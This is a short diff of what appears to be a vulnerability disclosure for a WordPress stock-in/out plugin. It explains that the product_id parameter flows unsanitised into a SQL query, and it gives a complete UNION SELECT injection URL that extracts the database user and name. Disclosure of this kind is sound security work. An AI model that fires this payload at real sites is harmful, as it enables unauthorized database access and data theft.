@@ -37,6 +37,7 @@ $query = $stock_in_log;
 
 ```
 The parameter $_GET['product_id'] is derectly used by select statement. Then, we can exploit it .
+
 http://www.target.com/wp-admin/admin.php?page=stock_in&product_id=0+union+select+1%2C2%2C3%2Cuser%28%29%2Cdatabase%28%29%2C6%2C7%2C8%2C9%2C10&tab=history
 
 ![blockchain](https://github.com/pang0lin/CVEproject/blob/main/imgs/wordpress_plugin_stockinandout_sqli.png "wordpress_plugin_stockinandout_sqli")
